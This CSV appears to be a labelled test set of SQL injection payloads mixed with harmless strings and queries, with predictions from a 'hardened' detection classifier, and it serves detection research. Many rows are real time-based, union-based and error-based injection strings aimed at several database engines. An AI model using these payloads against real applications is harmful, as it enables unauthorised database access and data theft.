payload,label,hardened_pred_label,hardened_pred_score
96174245k,0,0,7.950107e-06
58193627q,0,0,7.916924e-06
"  SELECT simple,metal,save FROM card LEFT JOIN Orders ON radio.suddenID =  sold.beside ORDER BY class.upper",0,0,7.957252e-06
robledo,0,0,7.992008e-06
lapidificar,0,0,7.9629e-06
"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu",1,1,0.99999166
DELETE FROM favorite WHERE tobacco = 'standard',0,0,8.004929e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28543 )  ORDER BY meta_id ASC",0,0,7.851913e-06
"1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",1,1,0.99999166
yaci,0,0,8.0357995e-06
DELETE FROM than WHERE nails = 'hold',0,0,7.990758e-06
 UPDATE drink SET ability = 'court'WHERE twice = 'union',0,0,7.877895e-06
SELECT * FROM hearing,0,0,8.157722e-06
1'||  (  select 'zxla' from dual where 7634  =  7634 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',1,1,0.99999154
SELECT * FROM by WHERE quickly = 'pain' LIMIT 3,0,0,8.011314e-06
doron@beljos.ch,0,0,7.902908e-06
"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,1,0.99999154
"  SELECT Orders.seldomrID, Employees.occur, Employees.income FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.weekID ORDER BY Orders.cowboyID",0,0,7.823002e-06
ducaux@muchachina.tk,0,0,7.901258e-06
FROM  ( SELECT DISTINCT solar FROM cotton ) ,0,0,7.911158e-06
29450,0,0,8.0305135e-06
"-7551 or elt  (  6900  =  7195,7195  )  ",1,1,0.99999166
SELECT * FROM mouth WHERE    NOT current = 'hall',0,0,7.983826e-06
mehd3,0,0,7.966804e-06
1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,1,1,0.99999166
89816761j,0,0,7.910871e-06
piperni,0,0,7.977159e-06
7770,0,0,8.007556e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11406 )  ORDER BY meta_id ASC",0,0,7.841063e-06
"1%'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,0.99999154
es2eri5o,0,0,7.930585e-06
"   SELECT Employees.one, COUNT ( Orders.wolfID )  AS signFROM    ( OrdersINNER JOIN tent ON Orders.exampleID  =  Employees.lastID ) ",0,0,7.911625e-06
"select * from generate_series  (  6730,6730,case when   (  6730  =  9431  )   then 1 else 0 end  )   limit 1--",1,1,0.99999166
1' where 1017  =  1017 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,1,0.99999154
SELECT * FROM post ORDER BY swimming DESC,0,0,8.093497e-06
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,0.99999154
SELECT * FROM press,0,0,8.195479e-06
"   SELECT sink, trade, men FROM fine WHERE move  IS NULL",0,0,8.0748705e-06
4742,0,0,8.023388e-06
"1"" and make_set  (  6520  =  9958,9958  )  ",1,1,0.99999166
barnett@micaelagriga.mw,0,0,7.922875e-06
SELECT AVG ( milk ) FROM written,0,0,8.106768e-06
SELECT * FROM simple,0,0,8.131872e-06
SELECT * FROM stepped WHERE tip NOT LIKE 'add%',0,0,8.081481e-06
"calle palmito, s/n, 12?g",0,0,7.949205e-06
ta1anta,0,0,7.986141e-06
SELECT * FROM standard FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM seeing,0,0,7.856932e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262312 )  ORDER BY meta_id ASC",0,0,7.838004e-06
SELECT * FROM difficult WHERE sick LIKE '%serve%',0,0,8.053084e-06
SELECT * FROM taken 3,0,0,7.996392e-06
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   -- yczq,1,1,0.99999166
00916150z,0,0,7.95704e-06
tridente,0,0,7.96328e-06
"1' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,0.99999166
"c/ santa olaja, 121 2?d",0,0,7.925187e-06
SELECT COUNT ( flow ) FROM mouse,0,0,8.112847e-06
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/template-compare.php' ORDER BY wp_posts.post_title ASC,0,0,7.970437e-06
1'||  (  select 'uebk' from dual where 6990  =  6990,1,1,0.99999166
SELECT * FROM family WHERE national = 'finish'  AND  ( thousand = 'how' OR shout = 'pan' ) ,0,0,8.0008695e-06
navia de suarna,0,0,7.922482e-06
"1""   )    )    and   (  7467  =  7962  )  *7962 and    (    (   ""nhld""  =  ""nhld",1,1,0.99999154
"  SELECT * FROM position WHERE broke IN  ( 'valuable', 'dinner', 'record' )  ",0,0,7.843119e-06
niwinska@estudiodeyoga.td,0,0,7.917793e-06
-4644 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # upwd,1,1,0.99999166
SELECT * FROM variety WHERE social = 'business'  OR fur = 'highest',0,0,8.128476e-06
" SELECT CustomerName, ContactName, Address FROM Customers WHERE Address  IS NULL;",0,0,8.004197e-06
SELECT * FROM wing ORDER BY control,0,0,8.312971e-06
2111,0,0,7.98538e-06
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,1,0.99999154
SELECT * FROM television FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.86944e-06
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   # idxq",1,1,0.99999166
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1,1,0.99999154
"1%'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '",1,1,0.99999166
SELECT * FROM lucky WHERE stream = 'seems',0,0,8.048354e-06
SELECT TOP 50 PERCENT * FROM wait SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM present,0,0,7.874012e-06
4350,0,0,8.028867e-06
1  )   where 5866  =  5866 and 4595  =  4595#,1,1,0.99999166
-7452 where 2224  =  2224 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,1,0.99999154
SELECT column_name FROM table_name WHERE condition GROUP BY column_name ORDER BY column_name;,0,0,8.026219e-06
"  SELECT dangerous,thin,leaving FROM cow LEFT JOIN Orders ON chamber.wireID =  coast.needle ORDER BY eat.could",0,0,7.94712e-06
pruja lantadilla,0,0,7.904175e-06
"1""   )    )    as nncz where 2331  =  2331",1,1,0.99999166
SELECT * FROM foot  WHERE lion = joined,0,0,8.055665e-06
alegra-dulantzi,0,0,7.905094e-06
-9054   )    )     )   or 9323  =  9323#,1,1,0.99999166
"-9749"" where 7083  =  7083 or make_set  (  7577  =  1182,1182  )  --",1,1,0.99999166
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,1,1,0.9999912
"1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748",1,1,0.99999154
"1%'   )    )     )   union all select null,null,null,null,null,null,null--",1,1,0.99999166
"  SELECT were,during,said FROM word LEFT JOIN Orders ON science.noneID =  star.rich ORDER BY congress.part",0,0,8.006732e-06
arrafiz,0,0,7.998893e-06
" SELECT * FROM machine ORDER BY range, eight",0,0,8.16542e-06
SELECT wheel ( s )  FROM cow LEFT JOIN,0,0,7.935108e-06
SELECT * FROM soldier WHERE tide  BETWEEN 10 AND 20,0,0,8.036665e-06
-2374  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  2576  =  2576,1,1,0.99999154
andara francino,0,0,7.946211e-06
SELECT * FROM mighty WHERE Price NOT BETWEEN 10 AND 20,0,0,7.987574e-06
corota,0,0,8.043743e-06
-8665' or 6825  =  7840 and 'vbsy' like 'vbsy,1,1,0.99999166
elsen@whitehat.td,0,0,7.903104e-06
1 where 4091  =  4091,1,1,0.99999166
1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,1,1,0.99999154
FROM  ( SELECT DISTINCT scared FROM respect ) ,0,0,7.925232e-06
1   )    )    as uqsi where 1644  =  1644 and 9198  =  9198--,1,1,0.99999166
"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,1,0.99999154
SELECT AVG ( knife ) FROM characteristic,0,0,8.094732e-06
"-4707' union all select 4414,4414,4414,4414,4414,4414#",1,1,0.99999166
antonio juez 67 3?a,0,0,7.900406e-06
alcal de la vega,0,0,7.907975e-06
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'fuyl'  =  'fuyl",1,1,0.99999166
1'+  (  select 'vnue' where 5807  =  5807,1,1,0.99999166
 )   or   (  a  =  a,1,1,0.99999166
SELECT * FROM capital,0,0,8.216671e-06
"-5431""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ipmo""  =  ""ipmo",1,1,0.99999154
" SELECT * FROM balloon ORDER BY climate, mostly",0,0,8.158928e-06
magrans ribes,0,0,7.95619e-06
"1%' union all select null,null,null,null,null,null#",1,1,0.99999166
mazursky@mundo-deportivo.mx,0,0,7.92688e-06
SELECT * FROM dust WHERE against BETWEEN means09/01/1996massage AND cream15/31/1996variety,0,0,7.880044e-06
cousinea,0,0,7.964905e-06
"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",1,1,0.99999166
"   SELECT nature,another,bicycle,specific,cheese     (  (  not JOIN citizen ON thumb.sell =  has.establish )   INNER JOIN reasonON Orders.hand =  quiet.mouseID ) ",0,0,7.98506e-06
1%' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  ',1,1,0.99999154
"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",1,1,0.99999166
SELECT * FROM anywhere WHERE one NOT LIKE '[attack]%',0,0,7.979625e-06
SELECT * FROM national WHERE with  BETWEEN 10 AND 20,0,0,8.131857e-06
42569454l,0,0,7.946218e-06
callie,0,0,8.005968e-06
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,1,0.99999154
tahull garola,0,0,7.928618e-06
"-1816""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dztr"" like ""dztr",1,1,0.99999154
SELECT * FROM select  WHERE to = current,0,0,7.830921e-06
47343175k,0,0,7.949007e-06
SELECT * FROM group,0,0,8.116686e-06
SELECT * FROM iron WHERE supply = 'least'  AND  ( advice = 'lot' OR party = 'potatoes' ) ,0,0,7.871609e-06
-5365 or 7517  =  5726--,1,1,0.99999154
SELECT strong,0,0,8.057408e-06
SELECT * FROM corn WHERE where = 'alive'  OR cow = 'at',0,0,7.94468e-06
"   SELECT locate,suit,material,nearer,fall     (  (  or JOIN halfway ON signal.image =  am.write )   INNER JOIN favoriteON Orders.is =  these.thinkID ) ",0,0,7.951168e-06
SELECT * FROM mice WHERE wrong = 'offer' FETCH FIRST 3 ROWS ONLY,0,0,7.985045e-06
rodolfo,0,0,8.0000145e-06
1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,1,1,0.99999166
SELECT * FROM claws  WHERE boy NOT LIKE '[thus]%',0,0,8.016313e-06
"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",1,1,0.99999166
pablo,0,0,8.01645e-06
"1'||  (  select 'kbvq' where 9279  =  9279 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1,1,0.99999154
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""gddl"" like ""gddl",1,1,0.99999154
SELECT * FROM flame WHERE book  BETWEEN 10 AND 20,0,0,8.041381e-06
"-3933%""   )    )    or elt  (  8142  =  2978,2978  )   and    (    (   ""%""  =  """,1,1,0.99999154
"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",1,1,0.99999166
"1%'  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,0.99999166
SELECT TOP 50 PERCENT * FROM raise,0,0,8.11938e-06
SELECT music ( s )  FROM garden LEFT JOIN,0,0,7.88408e-06
lasedad,0,0,7.961435e-06
41100,0,0,8.013714e-06
SELECT * FROM spread  WHERE curious = slow,0,0,8.168815e-06
1'+  (  select kfmv where 1679  =  1679,1,1,0.99999166
SELECT * FROM listen WHERE without BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.914682e-06
SELECT * FROM nearest  WHERE still = save,0,0,8.111347e-06
SELECT * FROM food WHERE lips NOT BETWEEN 'ordinary' AND 'mix',0,0,8.023158e-06
espins marmesat,0,0,7.920457e-06
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,0.99999154
"-9142%""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,1,0.99999154
"-4746%""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,1,0.99999154
"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,0.99999154
SELECT * FROM advice WHERE curve IN  ( SELECT mice FROM though ) ,0,0,7.885923e-06
SELECT * FROM particularly WHERE girl NOT LIKE 'letter%',0,0,8.072869e-06
orieta,0,0,7.988244e-06
8110,0,0,8.01097e-06
SELECT * FROM surface WHERE trap = 'iron',0,0,8.1632315e-06
"   SELECT Employees.house, COUNT ( Orders.picturedID )  AS nationalFROM    ( OrdersINNER JOIN series ON Orders.deeplyID  =  Employees.positionID ) ",0,0,7.927017e-06
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",1,1,0.99999154
lindt38,0,0,7.916901e-06
SELECT * FROM football,0,0,8.105091e-06
at89a7218,0,0,7.922587e-06
1  )   or sleep  (  __TIME__  )  #,1,1,0.99999166
"1""  )   as fgne where 7207  =  7207",1,1,0.99999166
"1""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,0.99999154
"1%"" union all select null,null,null,null,null--",1,1,0.99999166
SELECT * FROM willing FETCH FIRST 3 ROWS ONLY,0,0,7.887382e-06
"1   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  7589  =  7589",1,1,0.99999166
tarasova_dabo@comerciosdeaspe.ly,0,0,7.957821e-06
"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,1,0.99999154
" SELECT o.OrderID, o.OrderDate, c.CustomerName FROM Customers AS c, Orders AS o WHERE c.CustomerName = ""Around the Horn"" AND c.CustomerID = o.CustomerID;",0,0,7.850266e-06
"ametlla de mar, l'",0,0,7.896022e-06
"INSERT INTO automobile ( cry, strange, cost, though, wise, original )  VALUES  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )  ",0,0,7.926835e-06
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",1,1,0.99999154
hoyt,0,0,7.991162e-06
"1   )    )    as zkrr where 4730  =  4730 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,1,0.99999166
SELECT * FROM construction WHERE production BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.895533e-06
"1"" and elt  (  4249  =  4249,7259  )  ",1,1,0.99999166
r92e1*56e,0,0,7.904959e-06
SELECT * FROM require FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.899306e-06
SELECT * FROM star WHERE NOT own = 'structure'  AND NOT now = 'fair',0,0,8.038912e-06
63482988k,0,0,7.934965e-06
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,1,0.99999166
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,1,0.99999166
select sleep  (  5  )   and   (  'pwpc'  =  'pwpc,1,1,0.99999166
4945,0,0,8.009107e-06
tabar,0,0,8.036873e-06
1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1,1,0.99999166
"-4319""  )   where 7534  =  7534 or 8246  =  3217",1,1,0.99999166
1 where 9752  =  9752,1,1,0.99999166
butalov0@lettere.dm,0,0,7.904838e-06
remington,0,0,8.020748e-06
SELECT option_value FROM wp_options WHERE option_name  =  'options_middle_button_text' LIMIT 1,0,0,7.960319e-06
SELECT * FROM explore WHERE with = 'affect' LIMIT 3,0,0,7.882931e-06
yegorova@onlinegratis.aq,0,0,7.907386e-06
kaefer,0,0,8.045132e-06
9.66866E+15,0,0,7.909535e-06
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""fvtu"" like ""fvtu",1,1,0.99999154
SELECT AVG ( Price ) FROM movie,0,0,8.140981e-06
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'xcxr' like 'xcxr",1,1,0.99999154
" select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",1,1,0.99999166
"1' union all select null,null,null,null,null--",1,1,0.99999166
 UPDATE win SET affect = 'zero'WHERE must = 'slave',0,0,7.8541e-06
1'||  (  select 'xwbo' from dual where 1263  =  1263 waitfor delay '0:0:5'  )  ||',1,1,0.99999166
1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427,1,1,0.99999154
